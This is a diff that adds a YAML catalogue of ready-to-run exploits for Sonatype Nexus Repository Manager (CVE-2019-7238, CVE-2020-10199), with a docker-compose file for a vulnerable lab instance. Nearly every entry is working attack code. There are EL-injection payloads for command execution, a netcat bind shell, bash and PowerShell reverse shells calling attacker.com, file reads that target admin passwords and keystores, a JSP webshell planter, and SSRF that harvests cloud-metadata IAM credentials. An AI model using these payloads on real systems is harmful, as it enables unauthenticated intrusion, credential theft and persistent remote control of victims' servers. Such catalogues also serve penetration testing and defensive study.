@@ -1,0 +1,280 @@
+---
+comment: |
+  Sonatype Nexus Repository Manager (NXRM) is a Java-based artifact repository manager.
+
+  CVE-2019-7238 (CVSS 9.8): Unauthenticated RCE via Expression Language (EL) injection in the
+  NXRM 3 REST API. The search endpoint passes user-supplied input to a Java EL evaluator without
+  sanitisation, allowing arbitrary Java method invocation through ${...} expressions.
+  Affects NXRM 3 < 3.15.0.
+  Ref: https://www.exploit-db.com/exploits/46319
+
+  CVE-2020-10199 (CVSS 8.8): Authenticated RCE via EL injection in NXRM 3 < 3.21.2. The same
+  EL injection path but requires a valid user session.
+
+  CVE-2020-10204 (CVSS 7.2): Authenticated RCE via EL injection in NXRM 3 < 3.21.2 (admin required).
+
+  CVE-2019-5475: EL injection in the NXRM 2.x Yum repository plugin, requiring authentication.
+docker:
+  compose: "services:\n  nexus:\n    image: sonatype/nexus3:3.14.0\n    ports:\n \
+    \     - \"8081:8081\"\n    volumes:\n      - nexus_data:/nexus-data\nvolumes:\n\
+    \  nexus_data:\n"
+  note: "Starts Nexus Repository Manager 3.14.0 (vulnerable to CVE-2019-7238 unauthenticated\
+    \ EL injection RCE).\nAccess at `http://localhost:8081`. First startup takes approximately\
+    \ 2 minutes.\nOn first run, the default admin password is randomly generated and\
+    \ stored at:\n`/nexus-data/admin.password` \u2014 retrieve it with:\n`docker compose\
+    \ exec nexus cat /nexus-data/admin.password`\nThe unauthenticated EL injection\
+    \ (CVE-2019-7238) does not require any login.\n"
+functions:
+  bind-shell:
+  - code: |
+      # CVE-2019-7238: bind shell via EL injection (unauthenticated, NXRM3 < 3.15.0)
+      curl -s -X POST "http://victim.com:8081/service/extdirect" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "action": "coreui_Component",
+          "method": "previewAssets",
+          "data": [{
+            "page": 1,
+            "start": 0,
+            "limit": 25,
+            "filter": [
+              {"property": "repositoryName", "value": "*"},
+              {"property": "expression", "value": "${Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','nc -lvp 12345 -e /bin/sh &'})}"},
+              {"property": "type", "value": "jexl"}
+            ]
+          }],
+          "type": "rpc",
+          "tid": 1
+        }'
+    comment: |
+      CVE-2019-7238: opens a bind shell on TCP port 12345 via EL injection in the Nexus extdirect
+      API. The trailing & prevents the request from hanging. nc must support the -e flag on the
+      target host (standard on BusyBox and most Linux distributions).
+      Connect from the attacker with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: linux
+    tty: false
+    version: |
+      NXRM 3 < 3.15.0
+  file-read:
+  - code: "# CVE-2019-7238: read a file from the server via EL injection \u2014 output\
+      \ captured in response\npython3 - <<'EOF'\nimport requests, json\n\nTARGET =\
+      \ \"http://victim.com:8081\"\nFILE   = \"/etc/passwd\"\n# Key targets:\n# /nexus-data/admin.password\
+      \  (admin password on first run)\n# /nexus-data/etc/nexus.properties  (Nexus\
+      \ configuration)\n# /nexus-data/keystores/ssl/keystore.jks  (TLS keystore)\n\
+      \npayload = {\n    \"action\": \"coreui_Component\",\n    \"method\": \"previewAssets\"\
+      ,\n    \"data\": [{\n        \"page\": 1, \"start\": 0, \"limit\": 25,\n   \
+      \     \"filter\": [\n            {\"property\": \"repositoryName\", \"value\"\
+      : \"*\"},\n            {\"property\": \"expression\", \"value\":\n         \
+      \       \"${(new java.util.Scanner(new java.io.File('\" + FILE + \"'))).useDelimiter('\\\
+      \\\\\\A').next()}\"},\n            {\"property\": \"type\", \"value\": \"jexl\"\
+      },\n        ]\n    }],\n    \"type\": \"rpc\",\n    \"tid\": 1,\n}\nr = requests.post(TARGET\
+      \ + \"/service/extdirect\", json=payload)\n# The EL result is reflected inside\
+      \ the error message in the JSON response\nprint(r.text)\nEOF\n"
+    comment: "CVE-2019-7238: reads the full contents of an arbitrary file via EL injection\
+      \ using\njava.util.Scanner to consume the entire FileInputStream in one call.\
+      \ The file content\nis reflected in the JSON error response body when the EL\
+      \ expression resolves to a\nnon-null value that cannot be cast to the expected\
+      \ type.\n\nKey targets:\n- /nexus-data/admin.password \u2014 plaintext admin\
+      \ password (first-run only)\n- /nexus-data/etc/nexus.properties \u2014 SMTP,\
+      \ LDAP, and database configuration\n- /etc/passwd, /proc/1/environ \u2014 system\
+      \ enumeration\n"
+    contexts:
+      unauthenticated:
+    version: |
+      NXRM 3 < 3.15.0
+  rce:
+  - code: "# CVE-2019-7238: unauthenticated RCE via EL injection in the extdirect\
+      \ API (NXRM3 < 3.15.0)\ncurl -s -X POST \"http://victim.com:8081/service/extdirect\"\
+      \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"action\": \"\
+      coreui_Component\",\n    \"method\": \"previewAssets\",\n    \"data\": [{\n\
+      \      \"page\": 1,\n      \"start\": 0,\n      \"limit\": 25,\n      \"filter\"\
+      : [\n        {\"property\": \"repositoryName\", \"value\": \"*\"},\n       \
+      \ {\"property\": \"expression\", \"value\": \"${Runtime.getRuntime().exec('id')}\"\
+      },\n        {\"property\": \"type\", \"value\": \"jexl\"}\n      ]\n    }],\n\
+      \    \"type\": \"rpc\",\n    \"tid\": 1\n  }'\n\n# Output capture variant \u2014\
+      \ read command output from /tmp then retrieve via file-read:\n# expression:\
+      \ \"${Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','id > /tmp/out'})}\"\
+      \n# Then read /tmp/out using the file-read entry.\n"
+    comment: "CVE-2019-7238: the Nexus extdirect API endpoint at /service/extdirect\
+      \ evaluates the\n\"expression\" filter field through a JEXL (Java Expression\
+      \ Language) engine without\nsanitisation. Passing a ${...} expression invokes\
+      \ arbitrary Java methods as the Nexus\nprocess user (typically nexus or root\
+      \ in Docker).\n\nThe exec() call is fire-and-forget \u2014 stdout is not returned\
+      \ inline. To capture output,\nwrite results to a temp file and retrieve with\
+      \ the file-read entry, or use the\nreverse-shell entry for interactive access.\n\
+      \nRef: https://www.exploit-db.com/exploits/46319\nnuclei: CVE-2019-7238\n"
+    contexts:
+      unauthenticated:
+    version: |
+      NXRM 3 < 3.15.0
+  - code: |
+      # CVE-2020-10199: authenticated RCE via EL injection (NXRM3 < 3.21.2)
+      # First, obtain a session token with any valid user credentials:
+      SESSION=$(curl -s -c /tmp/nx.jar -X POST "http://victim.com:8081/service/rest/v1/security/users/authenticate" \
+        -H "Content-Type: application/json" \
+        -d '{"username":"user","password":"password"}' \
+        -o /dev/null -w '%{http_code}')
+
+      # Then send the same EL injection payload with session cookie:
+      curl -s -X POST "http://victim.com:8081/service/extdirect" \
+        -H "Content-Type: application/json" \
+        -b /tmp/nx.jar \
+        -d '{
+          "action": "coreui_Component",
+          "method": "previewAssets",
+          "data": [{
+            "page": 1,
+            "start": 0,
+            "limit": 25,
+            "filter": [
+              {"property": "repositoryName", "value": "*"},
+              {"property": "expression", "value": "${Runtime.getRuntime().exec('id')}"},
+              {"property": "type", "value": "jexl"}
+            ]
+          }],
+          "type": "rpc",
+          "tid": 1
+        }'
+    comment: |
+      CVE-2020-10199: the same JEXL injection path as CVE-2019-7238 but requires authentication.
+      Affects NXRM 3 < 3.21.2. Useful when CVE-2019-7238 is patched but the instance is still
+      on a vulnerable 3.15.x-3.20.x version. Any valid user account is sufficient.
+      nuclei: CVE-2020-10199
+    contexts:
+      authenticated:
+    version: |
+      NXRM 3.15.0 - 3.21.1
+  reverse-shell:
+  - blind: true
+    code: "# CVE-2019-7238: reverse shell via EL injection (unauthenticated, NXRM3\
+      \ < 3.15.0)\npython3 - <<'EOF'\nimport requests\n\nTARGET = \"http://victim.com:8081\"\
+      \nLHOST  = \"attacker.com\"\nLPORT  = \"12345\"\n\ncmd = f\"bash -i >& /dev/tcp/{LHOST}/{LPORT}\
+      \ 0>&1\"\npayload = {\n    \"action\": \"coreui_Component\",\n    \"method\"\
+      : \"previewAssets\",\n    \"data\": [{\n        \"page\": 1, \"start\": 0, \"\
+      limit\": 25,\n        \"filter\": [\n            {\"property\": \"repositoryName\"\
+      , \"value\": \"*\"},\n            {\"property\": \"expression\", \"value\":\n\
+      \                \"${Runtime.getRuntime().exec(new String[]{'/bin/bash','-c','\"\
+      \ + cmd + \"'})}\"},\n            {\"property\": \"type\", \"value\": \"jexl\"\
+      },\n        ]\n    }],\n    \"type\": \"rpc\",\n    \"tid\": 1,\n}\nrequests.post(TARGET\
+      \ + \"/service/extdirect\", json=payload)\nprint(f\"[*] Payload sent \u2014\
+      \ check listener on {LHOST}:{LPORT}\")\nEOF\n"
+    comment: "CVE-2019-7238: spawns a reverse bash shell via EL injection in the Nexus\
+      \ extdirect API.\nRuntime.exec() is fire-and-forget \u2014 the HTTP response\
+      \ returns immediately.\nThe shell runs as the Nexus process user (typically\
+      \ nexus or root in Docker containers).\n"
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      NXRM 3 < 3.15.0
+  - blind: true
+    code: "# CVE-2019-7238: PowerShell reverse shell via EL injection \u2014 Windows\
+      \ NXRM3 < 3.15.0\npython3 - <<'EOF'\nimport requests\n\nTARGET = \"http://victim.com:8081\"\
+      \nLHOST  = \"attacker.com\"\nLPORT  = \"12345\"\n\nps = (\n    f'$c=New-Object\
+      \ Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});'\n    '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'\n\
+      \    'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'\n    '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'\n\
+      \    '$r=(iex $d 2>&1|Out-String);'\n    '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'\n\
+      )\npayload = {\n    \"action\": \"coreui_Component\",\n    \"method\": \"previewAssets\"\
+      ,\n    \"data\": [{\n        \"page\": 1, \"start\": 0, \"limit\": 25,\n   \
+      \     \"filter\": [\n            {\"property\": \"repositoryName\", \"value\"\
+      : \"*\"},\n            {\"property\": \"expression\", \"value\":\n         \
+      \       \"${Runtime.getRuntime().exec(new String[]{'powershell','-NoP','-NonI','-W','Hidden','-Exec','Bypass','-Command','\"\
+      \ + ps + \"'})}\"},\n            {\"property\": \"type\", \"value\": \"jexl\"\
+      },\n        ]\n    }],\n    \"type\": \"rpc\",\n    \"tid\": 1,\n}\nrequests.post(TARGET\
+      \ + \"/service/extdirect\", json=payload)\nprint(f\"[*] Payload sent \u2014\
+      \ check listener on {LHOST}:{LPORT}\")\nEOF\n"
+    comment: |
+      CVE-2019-7238: PowerShell reverse shell for Windows NXRM3 deployments via EL injection.
+      Uses the same extdirect API path as the Linux variant. Runtime.exec() is fire-and-forget.
+      The shell connects to attacker.com:12345 and returns command output prefixed with the
+      current working directory prompt.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: windows
+    tty: false
+    version: |
+      NXRM 3 < 3.15.0
+  ssrf:
+  - code: "# Nexus proxy repository SSRF \u2014 admin configures a proxy repository\
+      \ pointing to an internal URL\n# Step 1: create a proxy repository targeting\
+      \ an internal service\ncurl -s -X POST \"http://victim.com:8081/service/rest/v1/repositories/maven/proxy\"\
+      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin123\" \\\
+      \n  -d '{\n    \"name\": \"ssrf-probe\",\n    \"online\": true,\n    \"storage\"\
+      : {\"blobStoreName\": \"default\", \"strictContentTypeValidation\": true},\n\
+      \    \"proxy\": {\n      \"remoteUrl\": \"http://169.254.169.254/latest/meta-data/\"\
+      ,\n      \"contentMaxAge\": 1,\n      \"metadataMaxAge\": 1\n    },\n    \"\
+      httpClient\": {\"blocked\": false, \"autoBlock\": false},\n    \"maven\": {\"\
+      versionPolicy\": \"MIXED\", \"layoutPolicy\": \"PERMISSIVE\"}\n  }'\n\n# Step\
+      \ 2: trigger a request through the proxy \u2014 Nexus fetches from the internal\
+      \ URL\ncurl -s \"http://victim.com:8081/repository/ssrf-probe/iam/security-credentials/\"\
+      \n\n# The response body from the internal service is proxied back to the attacker.\n\
+      # Useful targets:\n# AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      # GCP:        http://metadata.google.internal/computeMetadata/v1/\n# Azure:\
+      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Internal\
+      \ k8s API: http://10.0.0.1:6443/api/v1/namespaces\n"
+    comment: "Nexus proxy repositories fetch remote artifacts on behalf of clients.\
+      \ Any admin can configure\na proxy repository pointing to an arbitrary URL,\
+      \ causing Nexus to make outbound HTTP GET\nrequests to that URL when a client\
+      \ resolves an artifact through the proxy.\n\nThe full response body from the\
+      \ internal service is streamed back to the client, making this\na non-blind\
+      \ SSRF. Target cloud instance metadata endpoints to retrieve IAM credentials,\
+      \ or\nprobe internal services (databases, Kubernetes API, Redis) that are not\
+      \ accessible from\nthe attacker's network.\n\nThis is a design-level feature\
+      \ of Nexus, not a CVE \u2014 any admin account enables it.\n"
+    contexts:
+      admin:
+  webshell:
+  - code: |
+      # CVE-2019-7238: write a JSP webshell to the Nexus webapp directory via EL FileWriter
+      python3 - <<'EOF'
+      import requests
+
+      TARGET     = "http://victim.com:8081"
+      # Nexus 3 default web root inside the Docker image:
+      SHELL_PATH = "/opt/sonatype/nexus/public/shell.jsp"
+      SHELL_CODE = (
+          '<%@ page import="java.io.*" %>'
+          '<%String c=request.getParameter("c");if(c!=null){'
+          'String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);'
+          'out.print(new String(p.getInputStream().readAllBytes()));'
+          '}%>'
+      )
+
+      payload = {
+          "action": "coreui_Component",
+          "method": "previewAssets",
+          "data": [{
+              "page": 1, "start": 0, "limit": 25,
+              "filter": [
+                  {"property": "repositoryName", "value": "*"},
+                  {"property": "expression", "value":
+                      "${(new java.io.FileWriter('" + SHELL_PATH + "')).append('"
+                      + SHELL_CODE.replace("'", "\\'") + "').close()}"},
+                  {"property": "type", "value": "jexl"},
+              ]
+          }],
+          "type": "rpc",
+          "tid": 1,
+      }
+      r = requests.post(TARGET + "/service/extdirect", json=payload)
+      print(r.status_code)
+      print(f"[*] Shell at: {TARGET}/shell.jsp?c=id")
+      EOF
+    comment: |
+      CVE-2019-7238: writes a JSP webshell to the Nexus web root via EL FileWriter injection.
+      The JSP is served directly by Nexus's embedded Jetty server.
+
+      The default Nexus 3 Docker image serves static files from /opt/sonatype/nexus/public/.
+      Confirm the exact path by reading /proc/1/cmdline or /proc/1/environ with the file-read
+      entry. Access the deployed shell at: http://victim.com:8081/shell.jsp?c=id
+    contexts:
+      unauthenticated:
+    version: |
+      NXRM 3 < 3.15.0
+...
